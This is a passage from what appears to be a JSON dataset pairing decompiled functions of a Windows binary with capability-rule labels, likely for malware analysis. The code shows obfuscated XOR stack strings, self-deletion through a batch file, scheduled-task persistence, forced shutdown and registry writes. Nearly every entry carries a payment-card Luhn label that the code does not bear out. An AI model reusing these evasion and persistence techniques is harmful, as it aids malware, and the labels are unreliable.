0x2d21162d;\n    var_1ch = 0x744b050a;\n    var_18h = 0x32f375d;\n    var_14h._0_1_ = 0x69;\n    var_10h = 0x43537346;\n    var_ch = var_ch & 0xff000000 | 0x78696f;\n    fcn.00401000(0xd);\n    iVar4 = var_8h;\n    iVar10 = 0;\n    iVar6 = &var_20h - var_8h;\n    do {\n        var_8h = 7;\n        puVar1 = iVar10 + iVar4;\n        iVar9 = iVar10 % 7;\n        iVar10 = iVar10 + 1;\n        *puVar1 = *(&var_10h + iVar9) ^ puVar1[iVar6];\n    } while (iVar10 < 0xd);\n    fcn.00403bde(\"GTK DLL: pssup.cpp:%d > initVitualQuery : decrypt (char) %s -> %s\", 0x8d);\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_4h);\n    *0x427de8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar7);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    uVar7 = (*pcVar3)(0, var_4h);\n    (*pcVar2)(uVar7);\n    return;\n}\n",
        "token_count": 828
    },
    "0040af35": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040af35(int32_t param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    code *pcVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uchar var_2fh;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = *0x427a94;\n    var_14h = param_1;\n    if (*0x427de4 == NULL) {\n        var_4ch = 0x57191715;\n        var_48h = 0x31591400;\n        var_44h = 0x360b1420;\n        var_40h = 0x6401265b;\n        var_3ch = 0x43c0b04;\n        var_38h = 0x35453850;\n        var_34h._0_2_ = 0xc21;\n        var_10h = 7;\n        var_34h._2_1_ = 7;\n        stack0xffffffcb = 0x5a0e;\n        var_2fh = 0x51;\n        var_1ch = 0x616e7842;\n        var_18h = 0x50375134;\n        fcn.00401000(0x1e);\n        uVar6 = 0;\n        do {\n            puVar1 = uVar6 + var_8h;\n            uVar3 = uVar6 & 0x80000007;\n            if (uVar3 < 0) {\n                uVar3 = (uVar3 - 1 | 0xfffffff8) + 1;\n            }\n            uVar6 = uVar6 + 1;\n            *puVar1 = *(&var_1ch + uVar3) ^ puVar1[&var_4ch - var_8h];\n        } while (uVar6 < 0x1e);\n        fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupSetWow64Redirection : decrypt (char) %s -> %s\", 0xe2);\n        var_2ch = 0x2d21162d;\n        var_28h = 0x744b050a;\n        var_24h = 0x32f375d;\n        var_20h._0_1_ = 0x69;\n        var_1ch = 0x43537346;\n        var_18h = var_18h & 0xff000000 | 0x78696f;\n        fcn.00401000(0xd);\n        iVar8 = 0;\n        do {\n            puVar1 = iVar8 + var_ch;\n            iVar7 = iVar8 % var_10h;\n            iVar8 = iVar8 + 1;\n            *puVar1 = *(&var_1ch + iVar7) ^ puVar1[&var_2ch - var_ch];\n        } while (iVar8 < 0xd);\n        fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupSetWow64Redirection : decrypt (char) %s -> %s\", 0xe3);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_ch, var_8h);\n        *0x427de4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n        pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        uVar4 = (*pcVar2)(0, var_8h);\n        (*pcVar5)(uVar4);\n        pcVar5 = *0x427de4;\n        if (*0x427de4 == NULL) goto code_r0x0040b0b6;\n    }\n    iVar8 = var_14h;\n    pcVar5 = (**0x427de4)(var_14h);\n    if (pcVar5 != '\\0') {\n        *0x427a94 = iVar8 != 0;\n    }\ncode_r0x0040b0b6:\n    return pcVar5 & 0xffffff00 | var_1h;\n}\n",
        "token_count": 1150
    },
    "0040b314": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040b314(void)\n\n{\n    int32_t iVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_24h = 0x18;\n    var_20h = 0;\n    var_1ch = 0;\n    var_14h = 0;\n    var_10h = 0;\n    var_8h = 0;\n    var_18h = 0x40;\n    iVar1 = fcn.0040b1bd(&var_24h, &var_ch);\n    if (iVar1 < 0) {\n        fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupHandleFromProcessId : PsSupOpenProcess failed: %x\\n\", 0x219);\n        var_4h = 0xffffffff;\n    }\n    return var_4h;\n}\n",
        "token_count": 241
    },
    "0040c06a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040c06a(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint hModule;\n    uint var_4h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        iVar6 = 0x104;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(param_1, iVar3, iVar6);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if ((iVar4 == 0) || (iVar6 != iVar4)) break;\n            iVar6 = iVar6 + 0x104;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar1)(0, iVar6 * 2);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        } while (iVar3 != 0);\n        if (iVar3 != 0) {\n            if (iVar4 != 0) {\n                *param_2 = iVar3;\n                return 0;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            return uVar2;\n        }\n    }\n    return 8;\n}\n",
        "token_count": 425
    },
    "0040c11b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040c11b(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, L\"open\", param_1, param_2, 0, 0);\n    if (uVar1 < 0x21) {\n        fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupStartExeWithParam : ShellExecute failed. File: %s, error %u.\", 0x74b)\n        ;\n    }\n    else {\n        fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupStartExeWithParam : File %S successfully started with parameter \\\"%S\\\".\"\n                     , 0x746);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 200
    },
    "0040c16d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040c16d(int32_t param_1)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    char *pcVar10;\n    int32_t iVar11;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t lpString2;\n    \n    iVar8 = 8;\n    var_ch = 8;\n    lpString2 = param_1;\n    var_14h = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (param_1 != 0) {\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h * 2 + 0x1a);\n        iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        if (iVar5 != 0) {\n            var_10h = iVar5;\n            uVar4 = (*pcVar2)(0, var_14h * 2 + 6);\n            var_8h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n            if (var_8h != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar5, lpString2);\n                var_18h = (*_sym.imp.ntdll.dll_wcsrchr)(iVar5, 0x5c);\n                var_18h = var_18h + 2;\n                var_30h = 0x6b244244;\n                var_2ch = 0x507b512f;\n                var_28h = 0x6b294203;\n                var_24h = 0x5055512e;\n                var_20h = 0x6b484261;\n                var_1ch = 0x5055515a;\n                fcn.00401000(0x20);\n                iVar8 = var_14h;\n                uVar7 = 0;\n                do {\n                    puVar1 = uVar7 + var_14h;\n                    uVar6 = uVar7 & 0x80000007;\n                    if (uVar6 < 0) {\n                        uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n                    }\n                    uVar7 = uVar7 + 1;\n                    *puVar1 = *(&var_20h + uVar6) ^ puVar1[&var_30h - var_14h];\n                } while (uVar7 < 0x10);\n                fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupDeleteFileWithBat : decrypt (wide char) %s -> %ws\", 0x829);\n                uVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                pcVar3 = _sym.imp.USER32.dll_wsprintfW;\n                (*_sym.imp.USER32.dll_wsprintfW)(var_18h, iVar8, uVar4);\n                (*pcVar3)(var_8h, L\"\\\"%s\\\"\", lpString2);\n                uVar4 = (*pcVar2)(0, 0x104);\n                lpString2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n                if (lpString2 != 0) {\n                    var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    var_78h = 0x31101d10;\n                    var_74h = 0x62690a59;\n                    var_70h = 0x30494903;\n                    var_6ch = 0x6f214510;\n                    var_68h = 0x4e554c54;\n                    var_64h = 0x3a6c523a;\n                    var_60h = 0x2600637c;\n                    var_5ch = 0x6a6c485c;\n                    var_58h = 0x2a6e6440;\n                    var_54h = 0x372c4856;\n                    var_50h = 0x63101a18;\n                    var_4ch = 0x6f784d15;\n                    var_48h = 0x2c100616;\n                    var_44h = 0x423c4d10;\n                    var_40h = 0x2f010d7b;\n                    var_3ch = 0x7f6c4d10;\n                    var_38h._0_2_ = 0x637c;\n                    var_38h._2_1_ = 100;\n                    var_20h = 0x43646971;\n                    var_1ch = 0x4f496830;\n                    fcn.00401000(0x43);\n                    iVar5 = var_18h;\n                    uVar7 = 0;\n                    do {\n                        puVar1 = uVar7 + var_18h;\n                        uVar6 = uVar7 & 0x80000007;\n                        if (uVar6 < 0) {\n                            uVar6 = (uVar6 - 1 | 0xfffffff8) + 1;\n                        }\n                        uVar7 = uVar7 + 1;\n                        *puVar1 = *(&var_20h + uVar6) ^ puVar1[&var_78h - var_18h];\n                    } while (uVar7 < 0x43);\n                    pcVar10 = \"szBatFileContentTemplate2_EncryptedStackedBuffer\";\n                    uVar4 = 0x830;\n                    pcVar9 = \"GTK DLL: pssup.cpp:%d > PsSupDeleteFileWithBat : decrypt (char) %s -> %s\";\n                    iVar11 = var_18h;\n                    fcn.00403bde(\"GTK DLL: pssup.cpp:%d > PsSupDeleteFileWithBat : decrypt (char) %s -> %s\", 0x830);\n                    uVar4 = (*_sym.imp.USER32.dll_wsprintfA)(lpString2, iVar5, var_ch, var_ch, pcVar9, uVar4, pcVar10);\n                    var_ch = fcn.0040720d(uVar4);\n                    iVar8 = var_14h;\n                    if (var_ch == 0) {\n                        var_ch = fcn.0040c11b(iVar11);\n                    }\n                    uVar4 = (*pcVar2)(0, lpString2);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                    uVar4 = (*pcVar2)(0, iVar5);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                }\n                uVar4 = (*pcVar2)(0, var_8h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                uVar4 = (*pcVar2)(0, iVar8);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n                iVar8 = var_ch;\n                iVar5 = var_10h;\n            }\n            uVar4 = (*pcVar2)(0, iVar5);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        }\n    }\n    return iVar8;\n}\n",
        "token_count": 1856
    },
    "0040c486": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040c486(int32_t *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    uint hKey;\n    uint lpType;\n    uint lpcbData;\n    \n    *arg_8h = 0;\n    *arg_ch = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)();\n    if (iVar1 == 0) {\n        fcn.00403bde(\"GTK DLL: regstor.cpp:%d > RegGetValueData : Name %ws DataLength : %d\", 0x5c);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (iVar3 != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(in_ECX);\n            if (iVar1 == 0) {\n                *arg_8h = iVar3;\n                *arg_ch = 0;\n            }\n            else {\n                fcn.00403bde(\"GTK DLL: regstor.cpp:%d > RegGetValueData : Name %ws read failed : %p\", 0x72);\n            }\n        }\n    }\n    else {\n        fcn.00403bde(\"GTK DLL: regstor.cpp:%d > RegGetValueData : cant read %ws\", 0x78);\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 349
    },
    "0040cf05": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040cf05(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint s2;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar2 = 0;\n    uVar1 = 0;\n    var_1h._0_1_ = 0x22;\n    var_8h = 0;\n    do {\n        if (0x3ff < uVar1) {\n            sub.ntdll.dll_memcpy(iVar2 + param_1, &s2, uVar1);\n            iVar2 = iVar2 + uVar1;\n            uVar1 = 0;\n        }\n        *(&s2 + uVar1) = *(var_8h + param_1) ^ var_1h;\n        uVar1 = uVar1 + 1;\n        var_1h._0_1_ = var_1h + (var_8h % 0x85) * '\\x03';\n        var_8h = var_8h + 1;\n    } while (var_8h < 0x184);\n    if (uVar1 != 0) {\n        sub.ntdll.dll_memcpy(iVar2 + param_1, &s2, uVar1);\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "0040d0df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.0040d0df(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    bool bVar5;\n    char *lpString;\n    uint TokenHandle;\n    int32_t StringSid;\n    uint TokenInformationLength;\n    \n    bVar5 = false;\n    TokenInformationLength = 0;\n    TokenHandle = 0;\n    StringSid = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &TokenHandle);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n    if (iVar3 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.00403bde(\"GTK DLL: stdafx.cpp:%d > IsSystemUser : OpenProcessToken Error %u\\n\", 0xd1);\n        return false;\n    }\n    (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, TokenInformationLength, &TokenInformationLength);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    if ((iVar3 != 0x7a) ||\n       (puVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, TokenInformationLength),  puVar4 == NULL))\n    goto code_r0x0040d1be;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                      (TokenHandle, 1, puVar4, TokenInformationLength, &TokenInformationLength);\n    if (iVar3 == 0) {\n        (*pcVar1)();\n        uVar2 = 0xc4;\n        lpString = \"GTK DLL: stdafx.cpp:%d > IsSystemUser : GetTokenInformation Error %u\\n\";\ncode_r0x0040d1ae:\n        fcn.00403bde(lpString, uVar2);\n    }\n    else {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(*puVar4, &StringSid);\n        if ((iVar3 == 0) || (StringSid == 0)) {\n            (*pcVar1)();\n            uVar2 = 0xbf;\n            lpString = \"GTK DLL: stdafx.cpp:%d > IsSystemUser : \\nConvertSidToStringSidW failed. Error = %d\";\n            goto code_r0x0040d1ae;\n        }\n        iVar3 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(L\"S-1-5-18\", StringSid);\n        bVar5 = iVar3 == 0;\n        (*_sym.imp.KERNEL32.dll_LocalFree)(StringSid);\n    }\n    (*_sym.imp.KERNEL32.dll_GlobalFree)(puVar4);\ncode_r0x0040d1be:\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    return bVar5;\n}\n",
        "token_count": 659
    },
    "0040d41a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040d41a(uchar *lpSystemTime)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    uchar *puVar3;\n    uint lpFileTime;\n    uint var_8h;\n    \n    puVar2 = &lpFileTime;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    puVar3 = lpSystemTime;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_8h = sub.ntdll.dll__aullshr();\n    lpFileTime = *in_ECX;\n    iVar1 = (*_sym.imp.KERNEL32.dll_FileTimeToSystemTime)(&lpFileTime, lpSystemTime);\n    if (iVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > Time64ToSystemTime : [Time64ToSystemTime][failed to FileTimeToSystemTime][0x%x]\"\n                     , 0xf6);\n    }\n    return lpSystemTime;\n}\n",
        "token_count": 315
    },
    "0040d8b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040d8b3(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint noname_0_00;\n    bool bVar2;\n    char *lpString;\n    uint arglist;\n    int32_t *ppv;\n    int32_t *var_4h;\n    \n    bVar2 = false;\n    iVar1 = (*_sym.imp.ole32.dll_CoInitialize)(0);\n    if (iVar1 < 0) {\n        fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > TaskAddSch10 : CoInitialize failed: %x\", 0x1cb);\n    }\n    else {\n        iVar1 = (*_sym.imp.ole32.dll_CoCreateInstance)(0x411680, 0, 1, 0x411660, &ppv);\n        if (iVar1 < 0) {\n            fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > TaskAddSch10 : CoCreateInstance failed: %x\", 0x1c5);\n        }\n        else {\n            iVar1 = (**(*ppv + 0x20))(ppv);\n            if (iVar1 < 0) {\n                fcn.00403bde(\"GTK DLL: task_sheduler.cpp:%d > TaskAddSch10 : NewWorkItem failed: %x\", 0x1be);\n            }\n            else {\n                iVar1 = fcn.0040d5c8(noname_0_00, arg_ch);\n                if (iVar1 != 0) {\n                    iVar1 = (**(*ppv + 0x24))(ppv);\n                    bVar2 = -1 < iVar1;\n                    if (bVar2) {\n                        (**(*var_4h + 0x30))(var_4h);\n                        arglist = 0x1b6;\n                        lpString = \"GTK DLL: task_sheduler.cpp:%d > TaskAddSch10 : AddWorkItem succeeded: %x\";\n                    }\n                    else {\n                        arglist = 0x1b1;\n                        lpString = \"GTK DLL: task_sheduler.cpp:%d > TaskAddSch10 : AddWorkItem failed: %x\";\n                    }\n                    fcn.00403bde(lpString, arglist);\n                }\n                (**(*var_4h + 8))(var_4h);\n            }\n            (**(*ppv + 8))(ppv);\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return bVar2;\n}\n",
        "token_count": 555
    },
    "0040de13": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040de13(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint NewState;\n    uint lpLuid;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint TokenHandle;\n    int32_t var_4h;\n    \n    var_34h = 0xe65152a;\n    var_30h = 0x382d163b;\n    var_2ch = 0x14661e0e;\n    var_28h = 0x3b201427;\n    var_24h = 0x6653171c;\n    var_10h = 0x66367079;\n    var_ch = 0x5749624e;\n    fcn.00401000(0x14);\n    uVar6 = 0;\n    do {\n        puVar1 = uVar6 + var_4h;\n        uVar3 = uVar6 & 0x80000007;\n        if (uVar3 < 0) {\n            uVar3 = (uVar3 - 1 | 0xfffffff8) + 1;\n        }\n        uVar6 = uVar6 + 1;\n        *puVar1 = *(&var_10h + uVar3) ^ puVar1[&var_34h - var_4h];\n    } while (uVar6 < 0x14);\n    fcn.00403bde(\"GTK DLL: uninstall.cpp:%d > SystemShutdown : decrypt (char) %s -> %s\", 0x15);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n    (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar4);\n    (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, var_4h, &lpLuid);\n    NewState = 1;\n    var_14h = 2;\n    (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0, 0, 0);\n    pcVar2 = _sym.imp.USER32.dll_ExitWindowsEx;\n    iVar5 = (*_sym.imp.USER32.dll_ExitWindowsEx)(6, 0);\n    if (iVar5 == 0) {\n        (*pcVar2)(4, 0);\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return;\n}\n",
        "token_count": 642
    },
    "0040eb11": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040eb11(uint param_1)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint hKey;\n    \n    hKey = 0;\n    var_10h = *0x427a50;\n    var_44h = 0x451e5627;\n    var_40h = 0x501a4530;\n    var_3ch = 0x45105603;\n    var_38h = 0x500b4524;\n    var_34h = 0x453c5628;\n    var_30h = 0x500d453f;\n    var_2ch = 0x451e5606;\n    var_28h = 0x50014525;\n    var_24h = 0x45055612;\n    var_20h._0_2_ = 0x4556;\n    var_1ch = 0x45715674;\n    var_18h = 0x506e4556;\n    fcn.00401000(0x4c);\n    iVar8 = var_8h;\n    uVar5 = 0;\n    do {\n        puVar1 = uVar5 + var_8h;\n        uVar2 = uVar5 & 0x80000007;\n        if (uVar2 < 0) {\n            uVar2 = (uVar2 - 1 | 0xfffffff8) + 1;\n        }\n        uVar5 = uVar5 + 1;\n        *puVar1 = *(&var_1ch + uVar2) ^ puVar1[&var_44h - var_8h];\n    } while (uVar5 < 0x26);\n    fcn.00403bde(\"GTK DLL: vendor.cpp:%d > SaveVendorIDMarkSpecifyHive : decrypt (wide char) %s -> %ws\", 0x26);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(param_1, iVar8, 0, 0xf003f, &hKey);\n    if (iVar3 == 0) {\n        var_14h = fcn.0040eaef();\n        fcn.00403bde(\"GTK DLL: vendor.cpp:%d > SaveVendorIDMarkSpecifyHive : Opened hive : %s\", 0x29);\n        var_3ch = 0x50205511;\n        var_38h = 0x52357534;\n        var_34h = 0x463f5419;\n        var_30h = 0x551f5912;\n        var_2ch = 0x753e5035;\n        var_28h = 0x543c520a;\n        var_24h = 0x5910462a;\n        var_20h._0_2_ = 0x5552;\n        var_1ch = 0x50545552;\n        var_18h = var_18h & 0xff000000 | 0x597546;\n        fcn.00401000(0x3c);\n        iVar8 = var_ch;\n        iVar7 = 0;\n        iVar3 = &var_3ch - var_ch;\n        do {\n            var_ch = 7;\n            puVar1 = iVar7 + iVar8;\n            iVar6 = iVar7 % 7;\n            iVar7 = iVar7 + 1;\n            *puVar1 = *(&var_1ch + iVar6) ^ puVar1[iVar3];\n        } while (iVar7 < 0x1e);\n        fcn.00403bde(\"GTK DLL: vendor.cpp:%d > SaveVendorIDMarkSpecifyHive : decrypt (wide char) %s -> %ws\", 0x2a);\n        iVar3 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(hKey, iVar8, 0, 4, &var_10h, 4);\n        if (iVar3 == 0) {\n            fcn.00403bde(\"GTK DLL: vendor.cpp:%d > SaveVendorIDMarkSpecifyHive : Writed to %s\", 0x2d);\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n        iVar8 = var_8h;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return;\n}\n",
        "token_count": 1200
    },
    "0040ece8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key"
        ],
